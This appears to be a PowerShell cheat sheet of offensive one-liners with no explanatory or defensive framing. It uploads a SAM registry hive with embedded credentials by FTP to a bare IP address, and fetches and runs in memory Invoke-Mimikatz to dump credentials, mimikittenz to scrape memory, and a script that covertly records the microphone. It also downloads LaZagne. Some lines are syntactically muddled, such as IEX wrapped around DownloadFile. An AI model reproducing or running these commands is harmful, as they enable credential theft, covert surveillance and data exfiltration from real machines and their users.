function Download ($url,  $output)
{
   (New-Object System.Net.WebClient).DownloadFile($url, $output)
}
#Download -url "https://google.com" -output "x.html"

function DownloadString($url)
{
    (New-Object System.Net.WebClient).DownloadString($url); Function-From-PS-File
}

$shell = new-object -com shell.application;foreach($item in $shell.NameSpace("a.zip").items()){$shell.Namespace("C:\windows\temp").copyhere($item)}

(New-Object System.Net.WebClient).UploadFile((New-Object System.Uri('ftp://u481481097:holass11@31.170.165.172/mantis/sam.hiv') ),'sam.hiv')

IEX (New-Object System.Net.WebClient).DownloadFile('https://github.com/AlessandroZ/LaZagne/releases/download/2.3.1/Windows.zip', 'z.zip')

IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/master/Exfiltration/Invoke-Mimikatz.ps1'); $m = Invoke-Mimikatz -DumpCreds; $m

IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/master/Exfiltration/Get-MicrophoneAudio.ps1'); $m = Get-MicrophoneAudio -Path c:\windows\temp\secret.wav -Length 300 -Alias "SECRET"; $m

IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/putterpanda/mimikittenz/master/Invoke-mimikittenz.ps1'); Invoke-mimikittenz

IEX (New-Object System.Net.WebClient).DownloadFile('https://github.com/mitmproxy/mitmproxy/releases/download/v2.0.2/pathod-2.0.2-windows.zip', 'mitmp.zip')
